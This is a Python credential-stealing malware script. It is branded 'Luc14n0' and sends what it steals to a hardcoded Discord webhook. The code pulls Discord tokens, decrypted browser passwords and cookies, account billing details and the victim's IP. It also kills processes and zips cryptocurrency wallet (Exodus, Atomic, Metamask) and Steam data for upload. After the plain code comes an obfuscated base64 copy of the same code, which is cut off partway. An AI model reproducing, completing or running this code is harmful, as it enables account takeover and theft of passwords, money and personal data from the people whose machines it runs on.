import os
import threading
from sys import executable
from sqlite3 import connect as sql_connect
import re
from base64 import b64decode
from json import loads as json_loads, load
from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
from urllib.request import Request, urlopen
from json import loads, dumps
import time
import shutil
from zipfile import ZipFile
import random
import re
import subprocess

#  THIS IS 1.1.4 VERSION!
#  acee#0001 on cord
#


hook = "https://discord.com/api/webhooks/1066115311935443074/Y-LqZoVowl1xK8aW2RH5RKAm1HEHtHH4rtOpoZmtDzdH_aNaousaH27NcgLndp5vmDiA"
DETECTED = False


def getip():
    ip = "None"
    try:
        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except:
        pass
    return ip

requirements = [
    ["requests", "requests"],
    ["Crypto.Cipher", "pycryptodome"]
]
for modl in requirements:
    try: __import__(modl[0])
    except:
        subprocess.Popen(f"{executable} -m pip install {modl[1]}", shell=True)
        time.sleep(3)

import requests
from Crypto.Cipher import AES

local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')
temp = os.getenv("TEMP")
Threadlist = []


class DATA_BLOB(Structure):
    _fields_ = [
        ('cbData', wintypes.DWORD),
        ('pbData', POINTER(c_char))
    ]

def GetData(blob_out):
    cbData = int(blob_out.cbData)
    pbData = blob_out.pbData
    buffer = c_buffer(cbData)
    cdll.msvcrt.memcpy(buffer, pbData, cbData)
    windll.kernel32.LocalFree(pbData)
    return buffer.raw

def CryptUnprotectData(encrypted_bytes, entropy=b''):
    buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
    buffer_entropy = c_buffer(entropy, len(entropy))
    blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
    blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)
    blob_out = DATA_BLOB()

    if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)):
        return GetData(blob_out)

def DecryptValue(buff, master_key=None):
    starts = buff.decode(encoding='utf8', errors='ignore')[:3]
    if starts == 'v10' or starts == 'v11':
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass

def LoadRequests(methode, url, data='', files='', headers=''):
    for i in range(8): # max trys
        try:
            if methode == 'POST':
                if data != '':
                    r = requests.post(url, data=data)
                    if r.status_code == 200:
                        return r
                elif files != '':
                    r = requests.post(url, files=files)
                    if r.status_code == 200 or r.status_code == 413: # 413 = DATA TO BIG
                        return r
        except:
            pass

def LoadUrlib(hook, data='', files='', headers=''):
    for i in range(8):
        try:
            if headers != '':
                r = urlopen(Request(hook, data=data, headers=headers))
                return r
            else:
                r = urlopen(Request(hook, data=data))
                return r
        except:
            pass


def Trust(Cookies):
    # simple Trust Factor system
    global DETECTED
    data = str(Cookies)
    tim = re.findall(".google.com", data)
    # print(len(tim))
    if len(tim) < -1:
        DETECTED = True
        return DETECTED
    else:
        DETECTED = False
        return DETECTED

def GetBilling(token):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        billingjson = loads(urlopen(Request("https://discord.com/api/users/@me/billing/payment-sources", headers=headers)).read().decode())
    except:
        return False

    if billingjson == []: return " -"

    billing = ""
    for methode in billingjson:
        if methode["invalid"] == False:
            if methode["type"] == 1:
                billing += ":credit_card:"
            elif methode["type"] == 2:
                billing += ":parking: "

    return billing


def GetBadge(flags):
    if flags == 0: return ''

    OwnedBadges = ''
    badgeList =  [
        {"Name": 'Early_Verified_Bot_Developer', 'Value': 131072, 'Emoji': "<:developer:874750808472825986> "},
        {"Name": 'Bug_Hunter_Level_2', 'Value': 16384, 'Emoji': "<:bughunter_2:874750808430874664> "},
        {"Name": 'Early_Supporter', 'Value': 512, 'Emoji': "<:early_supporter:874750808414113823> "},
        {"Name": 'House_Balance', 'Value': 256, 'Emoji': "<:balance:874750808267292683> "},
        {"Name": 'House_Brilliance', 'Value': 128, 'Emoji': "<:brilliance:874750808338608199> "},
        {"Name": 'House_Bravery', 'Value': 64, 'Emoji': "<:bravery:874750808388952075> "},
        {"Name": 'Bug_Hunter_Level_1', 'Value': 8, 'Emoji': "<:bughunter_1:874750808426692658> "},
        {"Name": 'HypeSquad_Events', 'Value': 4, 'Emoji': "<:hypesquad_events:874750808594477056> "},
        {"Name": 'Partnered_Server_Owner', 'Value': 2,'Emoji': "<:partner:874750808678354964> "},
        {"Name": 'Discord_Employee', 'Value': 1, 'Emoji': "<:staff:874750808728666152> "}

    ]
    for badge in badgeList:
        if flags // badge["Value"] != 0:
            OwnedBadges += badge["Emoji"]
            flags = flags % badge["Value"]

    return OwnedBadges

def GetTokenInfo(token):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }

    userjson = loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers)).read().decode())
    username = userjson["username"]
    hashtag = userjson["discriminator"]
    email = userjson["email"]
    idd = userjson["id"]
    pfp = userjson["avatar"]
    flags = userjson["public_flags"]
    nitro = ""
    phone = "-"

    if "premium_type" in userjson:
        nitrot = userjson["premium_type"]
        if nitrot == 1:
            nitro = "<:classic:896119171019067423> "
        elif nitrot == 2:
            nitro = "<a:boost:824036778570416129> <:classic:896119171019067423> "
    if "phone" in userjson: phone = f'`{userjson["phone"]}`'

    return username, hashtag, email, idd, pfp, flags, nitro, phone

def checkToken(token):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers))
        return True
    except:
        return False


def uploadToken(token, path):
    global hook
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    username, hashtag, email, idd, pfp, flags, nitro, phone = GetTokenInfo(token)

    if pfp == None:
        pfp = "https://cdn.discordapp.com/attachments/1028745359293427714/1028854191810150512/unknown.png"
    else:
        pfp = f"https://cdn.discordapp.com/avatars/{idd}/{pfp}"

    billing = GetBilling(token)
    badge = GetBadge(flags)
    if not billing:
        badge, phone, billing = "🔒", "🔒", "🔒"
    if nitro == '' and badge == '': nitro = " -"

    data = {
        "content": f'Found in `{path}`',
        "embeds": [
            {
            "color": 14406413,
            "fields": [
                {
                    "name": ":rocket: Token:",
                    "value": f"`{token}`\n[Click to copy](https://superfurrycdn.nl/copy/{token})"
                },
                {
                    "name": ":envelope: Email:",
                    "value": f"`{email}`",
                    "inline": True
                },
                {
                    "name": ":mobile_phone: Phone:",
                    "value": f"{phone}",
                    "inline": True
                },
                {
                    "name": ":globe_with_meridians: IP:",
                    "value": f"`{getip()}`",
                    "inline": True
                },
                {
                    "name": ":beginner: Badges:",
                    "value": f"{nitro}{badge}",
                    "inline": True
                },
                {
                    "name": ":credit_card: Billing:",
                    "value": f"{billing}",
                    "inline": True
                }
                ],
            "author": {
                "name": f"{username}#{hashtag} ({idd})",
                "icon_url": f"{pfp}"
                },
            "footer": {
                "text": "by Luc14n0",
                "icon_url": "https://cdn.discordapp.com/attachments/1028745359293427714/1028854191810150512/unknown.png"
                },
            "thumbnail": {
                "url": f"{pfp}"
                }
            }
        ],
        "avatar_url": "https://cdn.discordapp.com/attachments/1028745359293427714/1028854191810150512/unknown.png",
        "username": "PWN3D!",
        "attachments": []
        }
    # urlopen(Request(hook, data=dumps(data).encode(), headers=headers))
    LoadUrlib(hook, data=dumps(data).encode(), headers=headers)

def Reformat(listt):
    e = re.findall("(\w+[a-z])",listt)
    while "https" in e: e.remove("https")
    while "com" in e: e.remove("com")
    while "net" in e: e.remove("net")
    return list(set(e))

def upload(name, tk=''):
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }

    if name == "kiwi":
        data = {
        "content": '',
        "embeds": [
            {
            "color": 14406413,
            "fields": [
                {
                "name": "Interesting files found on user PC:",
                "value": tk
                }
            ],
            "author": {
                "name": "Luc14n0 | File Stealer"
            },
            "footer": {
                "text": "by Luc14n0",
                "icon_url": "https://cdn.discordapp.com/attachments/1028745359293427714/1028854191810150512/unknown.png"
            }
            }
        ],
        "avatar_url": "https://cdn.discordapp.com/attachments/1028745359293427714/1028854191810150512/unknown.png",
        "attachments": []
        }
        # urlopen(Request(hook, data=dumps(data).encode(), headers=headers))
        LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
        return

    path = name
    files = {'file': open(path, 'rb')}
    # print(f"FILE= {files}")

    if "wppassw" in name:

        ra = ' | '.join(da for da in paswWords)

        if len(ra) > 1000:
            rrr = Reformat(str(paswWords))
            ra = ' | '.join(da for da in rrr)

        data = {
        "content": '',
        "embeds": [
            {
            "color": 14406413,
            "fields": [
                {
                "name": "Found:",
                "value": ra
                }
            ],
            "author": {
                "name": "Luc14n0 | Password Stealer"
            },
            "footer": {
                "text": "by Luc14n0",
                "icon_url": "https://cdn.discordapp.com/attachments/1028745359293427714/1028854191810150512/unknown.png"
            }
            }
        ],
        "avatar_url": "https://cdn.discordapp.com/attachments/1028745359293427714/1028854191810150512/unknown.png",
        "attachments": []
        }
        # urlopen(Request(hook, data=dumps(data).encode(), headers=headers))
        LoadUrlib(hook, data=dumps(data).encode(), headers=headers)

    if "wpcook" in name:
        rb = ' | '.join(da for da in cookiWords)
        if len(rb) > 1000:
            rrrrr = Reformat(str(cookiWords))
            rb = ' | '.join(da for da in rrrrr)

        data = {
        "content": '',
        "embeds": [
            {
            "color": 14406413,
            "fields": [
                {
                "name": "Found:",
                "value": rb
                }
            ],
            "author": {
                "name": "Luc14n0 | Cookies Stealer"
            },
            "footer": {
                "text": "by Luc14n0",
                "icon_url": "https://cdn.discordapp.com/attachments/1028745359293427714/1028854191810150512/unknown.png"
            }
            }
        ],
        "avatar_url": "https://cdn.discordapp.com/attachments/1028745359293427714/1028854191810150512/unknown.png",
        "attachments": []
        }
        # urlopen(Request(hook, data=dumps(data).encode(), headers=headers))
        LoadUrlib(hook, data=dumps(data).encode(), headers=headers)

    # r = requests.post(hook, files=files)
    LoadRequests("POST", hook, files=files)

def writeforfile(data, name):
    path = os.getenv("TEMP") + f"\wp{name}.txt"
    with open(path, mode='w', encoding='utf-8') as f:
        f.write(f"<--PSSWD PWN3D!! by Luc14n0-->\n\n")
        for line in data:
            if line[0] != '':
                f.write(f"{line}\n")

Tokens = ''
def getToken(path, arg):
    if not os.path.exists(path): return

    path += arg
    for file in os.listdir(path):
        if file.endswith(".log") or file.endswith(".ldb")   :
            for line in [x.strip() for x in open(f"{path}\\{file}", errors="ignore").readlines() if x.strip()]:
                for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", r"mfa\.[\w-]{80,95}"):
                    for token in re.findall(regex, line):
                        global Tokens
                        if checkToken(token):
                            if not token in Tokens:
                                # print(token)
                                Tokens += token
                                uploadToken(token, path)

Passw = []
def getPassw(path, arg):
    global Passw
    if not os.path.exists(path): return

    pathC = path + arg + "/Login Data"
    if os.stat(pathC).st_size == 0: return

    tempfold = temp + "wp" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"

    shutil.copy2(pathC, tempfold)
    conn = sql_connect(tempfold)
    cursor = conn.cursor()
    cursor.execute("SELECT action_url, username_value, password_value FROM logins;")
    data = cursor.fetchall()
    cursor.close()
    conn.close()
    os.remove(tempfold)

    pathKey = path + "/Local State"
    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
    master_key = CryptUnprotectData(master_key[5:])

    for row in data:
        if row[0] != '':
            for wa in keyword:
                old = wa
                if "https" in wa:
                    tmp = wa
                    wa = tmp.split('[')[1].split(']')[0]
                if wa in row[0]:
                    if not old in paswWords: paswWords.append(old)
            Passw.append(f"UR1: {row[0]} | U53RN4M3: {row[1]} | P455W0RD: {DecryptValue(row[2], master_key)}")
        # print([row[0], row[1], DecryptValue(row[2], master_key)])
    writeforfile(Passw, 'passw')

Cookies = []
def getCookie(path, arg):
    global Cookies
    if not os.path.exists(path): return

    pathC = path + arg + "/Cookies"
    if os.stat(pathC).st_size == 0: return

    tempfold = temp + "wp" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"

    shutil.copy2(pathC, tempfold)
    conn = sql_connect(tempfold)
    cursor = conn.cursor()
    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
    data = cursor.fetchall()
    cursor.close()
    conn.close()
    os.remove(tempfold)

    pathKey = path + "/Local State"

    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
    master_key = CryptUnprotectData(master_key[5:])

    for row in data:
        if row[0] != '':
            for wa in keyword:
                old = wa
                if "https" in wa:
                    tmp = wa
                    wa = tmp.split('[')[1].split(']')[0]
                if wa in row[0]:
                    if not old in cookiWords: cookiWords.append(old)
            Cookies.append(f"H057 K3Y: {row[0]} | N4M3: {row[1]} | V41U3: {DecryptValue(row[2], master_key)}")
        # print([row[0], row[1], DecryptValue(row[2], master_key)])
    writeforfile(Cookies, 'cook')

def GetDiscord(path, arg):
    if not os.path.exists(f"{path}/Local State"): return

    pathC = path + arg

    pathKey = path + "/Local State"
    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
    master_key = CryptUnprotectData(master_key[5:])
    # print(path, master_key)

    for file in os.listdir(pathC):
        # print(path, file)
        if file.endswith(".log") or file.endswith(".ldb")   :
            for line in [x.strip() for x in open(f"{pathC}\\{file}", errors="ignore").readlines() if x.strip()]:
                for token in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                    global Tokens
                    tokenDecoded = DecryptValue(b64decode(token.split('dQw4w9WgXcQ:')[1]), master_key)
                    if checkToken(tokenDecoded):
                        if not tokenDecoded in Tokens:
                            # print(token)
                            Tokens += tokenDecoded
                            # writeforfile(Tokens, 'tokens')
                            uploadToken(tokenDecoded, path)


def ZipThings(path, arg, procc):
    pathC = path
    name = arg
    # subprocess.Popen(f"taskkill /im {procc} /t /f", shell=True)
    # os.system(f"taskkill /im {procc} /t /f")

    if "nkbihfbeogaeaoehlefnkodbefgpgknn" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"Metamask_{browser}"
        pathC = path + arg

    if not os.path.exists(pathC): return
    subprocess.Popen(f"taskkill /im {procc} /t /f", shell=True)

    if "Wallet" in arg or "NationsGlory" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"{browser}"

    elif "Steam" in arg:
        if not os.path.isfile(f"{pathC}/loginusers.vdf"): return
        f = open(f"{pathC}/loginusers.vdf", "r+", encoding="utf8")
        data = f.readlines()
        # print(data)
        found = False
        for l in data:
            if 'RememberPassword"\t\t"1"' in l:
                found = True
        if found == False: return
        name = arg

    zf = ZipFile(f"{pathC}/{name}.zip", "w")
    for file in os.listdir(pathC):
        if not ".zip" in file: zf.write(pathC + "/" + file)
    zf.close()

    upload(f'{pathC}/{name}.zip')
    os.remove(f"{pathC}/{name}.zip")


def GatherAll():
    '                   Default Path < 0 >                         ProcesName < 1 >        Token  < 2 >              Password < 3 >     Cookies < 4 >                          Extentions < 5 >                                  '
    browserPaths = [
        [f"{roaming}/Opera Software/Opera GX Stable",               "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
        [f"{roaming}/Opera Software/Opera Stable",                  "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
        [f"{roaming}/Opera Software/Opera Neon/User Data/Default",  "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
        [f"{local}/Google/Chrome/User Data",                        "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
        [f"{local}/Google/Chrome SxS/User Data",                    "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
        [f"{local}/BraveSoftware/Brave-Browser/User Data",          "brave.exe",    "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
        [f"{local}/Yandex/YandexBrowser/User Data",                 "yandex.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn"                                    ],
        [f"{local}/Microsoft/Edge/User Data",                       "edge.exe",     "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ]
    ]

    discordPaths = [
        [f"{roaming}/Discord", "/Local Storage/leveldb"],
        [f"{roaming}/Lightcord", "/Local Storage/leveldb"],
        [f"{roaming}/discordcanary", "/Local Storage/leveldb"],
        [f"{roaming}/discordptb", "/Local Storage/leveldb"],
    ]

    PathsToZip = [
        [f"{roaming}/atomic/Local Storage/leveldb", '"Atomic Wallet.exe"', "Wallet"],
        [f"{roaming}/Exodus/exodus.wallet", "Exodus.exe", "Wallet"],
        ["C:\Program Files (x86)\Steam\config", "steam.exe", "Steam"],
        [f"{roaming}/NationsGlory/Local Storage/leveldb", "NationsGlory.exe", "NationsGlory"]
    ]

    for patt in browserPaths:
        a = threading.Thread(target=getToken, args=[patt[0], patt[2]])
        a.start()
        Threadlist.append(a)
    for patt in discordPaths:
        a = threading.Thread(target=GetDiscord, args=[patt[0], patt[1]])
        a.start()
        Threadlist.append(a)

    for patt in browserPaths:
        a = threading.Thread(target=getPassw, args=[patt[0], patt[3]])
        a.start()
        Threadlist.append(a)

    ThCokk = []
    for patt in browserPaths:
        a = threading.Thread(target=getCookie, args=[patt[0], patt[4]])
        a.start()
        ThCokk.append(a)

    for thread in ThCokk: thread.join()
    DETECTED = Trust(Cookies)
# Python code obfuscated by www.development-tools.net 
 

import base64, codecs
magic = 'aW1wb3J0IG9zDQppbXBvcnQgdGhyZWFkaW5nDQpmcm9tIHN5cyBpbXBvcnQgZXhlY3V0YWJsZQ0KZnJvbSBzcWxpdGUzIGltcG9ydCBjb25uZWN0IGFzIHNxbF9jb25uZWN0DQppbXBvcnQgcmUNCmZyb20gYmFzZTY0IGltcG9ydCBiNjRkZWNvZGUNCmZyb20ganNvbiBpbXBvcnQgbG9hZHMgYXMganNvbl9sb2FkcywgbG9hZA0KZnJvbSBjdHlwZXMgaW1wb3J0IHdpbmRsbCwgd2ludHlwZXMsIGJ5cmVmLCBjZGxsLCBTdHJ1Y3R1cmUsIFBPSU5URVIsIGNfY2hhciwgY19idWZmZXINCmZyb20gdXJsbGliLnJlcXVlc3QgaW1wb3J0IFJlcXVlc3QsIHVybG9wZW4NCmZyb20ganNvbiBpbXBvcnQgbG9hZHMsIGR1bXBzDQppbXBvcnQgdGltZQ0KaW1wb3J0IHNodXRpbA0KZnJvbSB6aXBmaWxlIGltcG9ydCBaaXBGaWxlDQppbXBvcnQgcmFuZG9tDQppbXBvcnQgcmUNCmltcG9ydCBzdWJwcm9jZXNzDQoNCiMgIFRISVMgSVMgMS4xLjQgVkVSU0lPTiENCiMgIGFjZWUjMDAwMSBvbiBjb3JkDQojDQoNCg0KaG9vayA9ICJodHRwczovL2Rpc2NvcmQuY29tL2FwaS93ZWJob29rcy8xMDY2MTE1MzExOTM1NDQzMDc0L1ktTHFab1Zvd2wxeEs4YVcyUkg1UktBbTFIRUh0SEg0cnRPcG9abXREemRIX2FOYW91c2FIMjdOY2dMbmRwNXZtRGlBIg0KREVURUNURUQgPSBGYWxzZQ0KDQoNCmRlZiBnZXRpcCgpOg0KICAgIGlwID0gIk5vbmUiDQogICAgdHJ5Og0KICAgICAgICBpcCA9IHVybG9wZW4oUmVxdWVzdCgiaHR0cHM6Ly9hcGkuaXBpZnkub3JnIikpLnJlYWQoKS5kZWNvZGUoKS5zdHJpcCgpDQogICAgZXhjZXB0Og0KICAgICAgICBwYXNzDQogICAgcmV0dXJuIGlwDQoNCnJlcXVpcmVtZW50cyA9IFsNCiAgICBbInJlcXVlc3RzIiwgInJlcXVlc3RzIl0sDQogICAgWyJDcnlwdG8uQ2lwaGVyIiwgInB5Y3J5cHRvZG9tZSJdDQpdDQpmb3IgbW9kbCBpbiByZXF1aXJlbWVudHM6DQogICAgdHJ5OiBfX2ltcG9ydF9fKG1vZGxbMF0pDQogICAgZXhjZXB0Og0KICAgICAgICBzdWJwcm9jZXNzLlBvcGVuKGYie2V4ZWN1dGFibGV9IC1tIHBpcCBpbnN0YWxsIHttb2RsWzFdfSIsIHNoZWxsPVRydWUpDQogICAgICAgIHRpbWUuc2xlZXAoMykNCg0KaW1wb3J0IHJlcXVlc3RzDQpmcm9tIENyeXB0by5DaXBoZXIgaW1wb3J0IEFFUw0KDQpsb2NhbCA9IG9zLmdldGVudignTE9DQUxBUFBEQVRBJykNCnJvYW1pbmcgPSBvcy5nZXRlbnYoJ0FQUERBVEEnKQ0KdGVtcCA9IG9zLmdldGVudigiVEVNUCIpDQpUaHJlYWRsaXN0ID0gW10NCg0KDQpjbGFzcyBEQVRBX0JMT0IoU3RydWN0dXJlKToNCiAgICBfZmllbGRzXyA9IFsNCiAgICAgICAgKCdjYkRhdGEnLCB3aW50eXBlcy5EV09SRCksDQogICAgICAgICgncGJEYXRhJywgUE9JTlRFUihjX2NoYXIpKQ0KICAgIF0NCg0KZGVmIEdldERhdGEoYmxvYl9vdXQpOg0KICAgIGNiRGF0YSA9IGludChibG9iX291dC5jYkRhdGEpDQogICAgcGJEYXRhID0gYmxvYl9vdXQucGJEYXRhDQogICAgYnVmZmVyID0gY19idWZmZXIoY2JEYXRhKQ0KICAgIGNkbGwubXN2Y3J0Lm1lbWNweShidWZmZXIsIHBiRGF0YSwgY2JEYXRhKQ0KICAgIHdpbmRsbC5rZXJuZWwzMi5Mb2NhbEZyZWUocGJEYXRhKQ0KICAgIHJldHVybiBidWZmZXIucmF3DQoNCmRlZiBDcnlwdFVucHJvdGVjdERhdGEoZW5jcnlwdGVkX2J5dGVzLCBlbnRyb3B5PWInJyk6DQogICAgYnVmZmVyX2luID0gY19idWZmZXIoZW5jcnlwdGVkX2J5dGVzLCBsZW4oZW5jcnlwdGVkX2J5dGVzKSkNCiAgICBidWZmZXJfZW50cm9weSA9IGNfYnVmZmVyKGVudHJvcHksIGxlbihlbnRyb3B5KSkNCiAgICBibG9iX2luID0gREFUQV9CTE9CKGxlbihlbmNyeXB0ZWRfYnl0ZXMpLCBidWZmZXJfaW4pDQogICAgYmxvYl9lbnRyb3B5ID0gREFUQV9CTE9CKGxlbihlbnRyb3B5KSwgYnVmZmVyX2VudHJvcHkpDQogICAgYmxvYl9vdXQgPSBEQVRBX0JMT0IoKQ0KDQogICAgaWYgd2luZGxsLmNyeXB0MzIuQ3J5cHRVbnByb3RlY3REYXRhKGJ5cmVmKGJsb2JfaW4pLCBOb25lLCBieXJlZihibG9iX2VudHJvcHkpLCBOb25lLCBOb25lLCAweDAxLCBieXJlZihibG9iX291dCkpOg0KICAgICAgICByZXR1cm4gR2V0RGF0YShibG9iX291dCkNCg0KZGVmIERlY3J5cHRWYWx1ZShidWZmLCBtYXN0ZXJfa2V5PU5vbmUpOg0KICAgIHN0YXJ0cyA9IGJ1ZmYuZGVjb2RlKGVuY29kaW5nPSd1dGY4JywgZXJyb3JzPSdpZ25vcmUnKVs6M10NCiAgICBpZiBzdGFydHMgPT0gJ3YxMCcgb3Igc3RhcnRzID09ICd2MTEnOg0KICAgICAgICBpdiA9IGJ1ZmZbMzoxNV0NCiAgICAgICAgcGF5bG9hZCA9IGJ1ZmZbMTU6XQ0KICAgICAgICBjaXBoZXIgPSBBRVMubmV3KG1hc3Rlcl9rZXksIEFFUy5NT0RFX0dDTSwgaXYpDQogICAgICAgIGRlY3J5cHRlZF9wYXNzID0gY2lwaGVyLmRlY3J5cHQocGF5bG9hZCkNCiAgICAgICAgZGVjcnlwdGVkX3Bhc3MgPSBkZWNyeXB0ZWRfcGFzc1s6LTE2XS5kZWNvZGUoKQ0KICAgICAgICByZXR1cm4gZGVjcnlwdGVkX3Bhc3MNCg0KZGVmIExvYWRSZXF1ZXN0cyhtZXRob2RlLCB1cmwsIGRhdGE9JycsIGZpbGVzPScnLCBoZWFkZXJzPScnKToNCiAgICBmb3IgaSBpbiByYW5nZSg4KTogIyBtYXggdHJ5cw0KICAgICAgICB0cnk6DQogICAgICAgICAgICBpZiBtZXRob2RlID09ICdQT1NUJzoNCiAgICAgICAgICAgICAgICBpZiBkYXRhICE9ICcnOg0KICAgICAgICAgICAgICAgICAgICByID0gcmVxdWVzdHMucG9zdCh1cmwsIGRhdGE9ZGF0YSkNCiAgICAgICAgICAgICAgICAgICAgaWYgci5zdGF0dXNfY29kZSA9PSAyMDA6DQogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gcg0KICAgICAgICAgICAgICAgIGVsaWYgZmlsZXMgIT0gJyc6DQogICAgICAgICAgICAgICAgICAgIHIgPSByZXF1ZXN0cy5wb3N0KHVybCwgZmlsZXM9ZmlsZXMpDQogICAgICAgICAgICAgICAgICAgIGlmIHIuc3RhdHVzX2NvZGUgPT0gMjAwIG9yIHIuc3RhdHVzX2NvZGUgPT0gNDEzOiAjIDQxMyA9IERBVEEgVE8gQklHDQogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gcg0KICAgICAgICBleGNlcHQ6DQogICAgICAgICAgICBwYXNzDQoNCmRlZiBMb2FkVXJsaWIoaG9vaywgZGF0YT0nJywgZmlsZXM9JycsIGhlYWRlcnM9JycpOg0KICAgIGZvciBpIGluIHJhbmdlKDgpOg0KICAgICAgICB0cnk6DQogICAgICAgICAgICBpZiBoZWFkZXJzICE9ICcnOg0KICAgICAgICAgICAgICAgIHIgPSB1cmxvcGVuKFJlcXVlc3QoaG9vaywgZGF0YT1kYXRhLCBoZWFkZXJzPWhlYWRlcnMpKQ0KICAgICAgICAgICAgICAgIHJldHVybiByDQogICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgIHIgPSB1cmxvcGVuKFJlcXVlc3QoaG9vaywgZGF0YT1kYXRhKSkNCiAgICAgICAgICAgICAgICByZXR1cm4gcg0KICAgICAgICBleGNlcHQ6DQogICAgICAgICAgICBwYXNzDQoNCg0KZGVmIFRydXN0KENvb2tpZXMpOg0KICAgICMgc2ltcGxlIFRydXN0IEZhY3RvciBzeXN0ZW0NCiAgICBnbG9iYWwgREVURUNURUQNCiAgICBkYXRhID0gc3RyKENvb2tpZXMpDQogICAgdGltID0gcmUuZmluZGFsbCgiLmdvb2dsZS5jb20iLCBkYXRhKQ0KICAgICMgcHJpbnQobGVuKHRpbSkpDQogICAgaWYgbGVuKHRpbSkgPCAtMToNCiAgICAgICAgREVURUNURUQgPSBUcnVlDQogICAgICAgIHJldHVybiBERVRFQ1RFRA0KICAgIGVsc2U6DQogICAgICAgIERFVEVDVEVEID0gRmFsc2UNCiAgICAgICAgcmV0dXJuIERFVEVDVEVEDQoNCmRlZiBHZXRCaWxsaW5nKHRva2VuKToNCiAgICBoZWFkZXJzID0gew0KICAgICAgICAiQXV0aG9yaXphdGlvbiI6IHRva2VuLA0KICAgICAgICAiQ29udGVudC1UeXBlIjogImFwcGxpY2F0aW9uL2pzb24iLA0KICAgICAgICAiVXNlci1BZ2VudCI6ICJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0OyBydjoxMDIuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDIuMCINCiAgICB9DQogICAgdHJ5Og0KICAgICAgICBiaWxsaW5nanNvbiA9IGxvYWRzKHVybG9wZW4oUmVxdWVzdCgiaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvdXNlcnMvQG1lL2JpbGxpbmcvcGF5bWVudC1zb3VyY2VzIiwgaGVhZGVycz1oZWFkZXJzKSkucmVhZCgpLmRlY29kZSgpKQ0KICAgIGV4Y2VwdDoNCiAgICAgICAgcmV0dXJuIEZhbHNlDQoNCiAgICBpZiBiaWxsaW5nanNvbiA9PSBbXTogcmV0dXJuICIgLSINCg0KICAgIGJpbGxpbmcgPSAiIg0KICAgIGZvciBtZXRob2RlIGluIGJpbGxpbmdqc29uOg0KICAgICAgICBpZiBtZXRob2RlWyJpbnZhbGlkIl0gPT0gRmFsc2U6DQogICAgICAgICAgICBpZiBtZXRob2RlWyJ0eXBlIl0gPT0gMToNCiAgICAgICAgICAgICAgICBiaWxsaW5nICs9ICI6Y3JlZGl0X2NhcmQ6Ig0KICAgICAgICAgICAgZWxpZiBtZXRob2RlWyJ0eXBlIl0gPT0gMjoNCiAgICAgICAgICAgICAgICBiaWxsaW5nICs9ICI6cGFya2luZzogIg0KDQogICAgcmV0dXJuIGJpbGxpbmcNCg0KDQpkZWYg